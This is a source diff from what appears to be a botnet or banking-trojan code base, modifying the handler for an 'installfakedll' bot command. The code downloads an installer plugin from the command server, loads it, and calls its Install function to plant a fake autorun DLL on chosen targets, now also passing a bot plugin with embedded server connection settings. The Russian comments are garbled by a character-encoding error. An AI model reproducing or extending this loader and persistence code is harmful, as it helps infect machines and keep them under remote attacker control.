@@ -883,20 +883,26 @@ void AsyncInstallFakeDll(void* Arguments)
 {
 	PCHAR ParamList = (PCHAR)Arguments;
 
-	// ¬ параметрах идет об€зательный парамет PlugName и необ€хательный Target
-	string PlugName = GetCommandParamByIndex(ParamList, 0);
-	string Target   = GetCommandParamByIndex(ParamList, 1);
+	// ¬ параметрах идет об€зательные параметрами PlugName, BotPlugName и 
+	// необ€зательный параметр Target
+	string InstallerPlugName = GetCommandParamByIndex(ParamList, 0);
+	string BotPlugName       = GetCommandParamByIndex(ParamList, 1);
+	string Target            = GetCommandParamByIndex(ParamList, 2);
 	
 	// ѕосле парсинга сразу освобождаем пам€ть списка
 	STR::Free(ParamList);
 
 	// ƒл€ сервера нужны только имена в нижнем регистре
-	STR::AnsiLowerCase(PlugName.t_str());
+	STR::AnsiLowerCase(InstallerPlugName.t_str());
 
-	TASKDBG("AsyncInstallFakeDll", "Started with '%s'", PlugName.t_str());
+	TASKDBG("AsyncInstallFakeDll", "Started with InstallerPlugName='%s' BotPlugName='%s' Target='%s'",
+		InstallerPlugName.t_str(),
+		BotPlugName.t_str(),
+		Target.t_str()
+		);
 
 	DWORD  InstallerPlugSize = 0;
-	LPBYTE InstallerPlug = Plugin::DownloadEx(PlugName.t_str(), NULL, &InstallerPlugSize, true, false, NULL);
+	LPBYTE InstallerPlug = Plugin::DownloadEx(InstallerPlugName.t_str(), NULL, &InstallerPlugSize, true, false, NULL);
 	TASKDBG("AsyncInstallFakeDll", "Download() return body=0x%X size=%d", InstallerPlug, 
 		InstallerPlugSize);
 
@@ -916,6 +922,7 @@ void AsyncInstallFakeDll(void* Arguments)
 
 		// Installer.plug должен импортировать ф-ции Install(target, body, size).
 		typedef BOOL (WINAPI *FakeInstallFunction)(
+			const char* BotPlugName, 
 			const char* Target, 
 			const void* InstallerBody, 
 			DWORD InstallerBodySize
@@ -928,7 +935,8 @@ void AsyncInstallFakeDll(void* Arguments)
 		if (FakeInstall == NULL) break;
 
 		TASKDBG("AsyncInstallFakeDll", "running FakeInstall.");
-		BOOL FakeInstallResult = FakeInstall(Target.t_str(), InstallerPlug, InstallerPlugSize);
+		BOOL FakeInstallResult = FakeInstall(BotPlugName.t_str(), Target.t_str(), 
+			InstallerPlug, InstallerPlugSize);
 		
 		TASKDBG("AsyncInstallFakeDll", "Installation result=%d.", FakeInstallResult);
 
@@ -942,8 +950,11 @@ void AsyncInstallFakeDll(void* Arguments)
 
 
 //  оманда скачивани€ и запуска инсталера FakeAutorunDll
-//  оманда: installfakedll <InstallerName.plug> [<Target>]
+//  оманда: installfakedll <InstallerName.plug> <BuildedBotPlugName.plug> [<Target>]
 // <InstallerName.plug> - им€ инстал€тора на сервере
+//
+// <BuildedBotPlugName.plug> - им€ плагина бот со встроенными параметрами дл€ подключени€ к серверу.
+//
 // <Target> - необ€зательный параметр. ”казывает конкретные цели установки. ≈сли ничего не указано 
 //            ставитс€ по все возможные цели, который поддерживает инстал€тор.
 
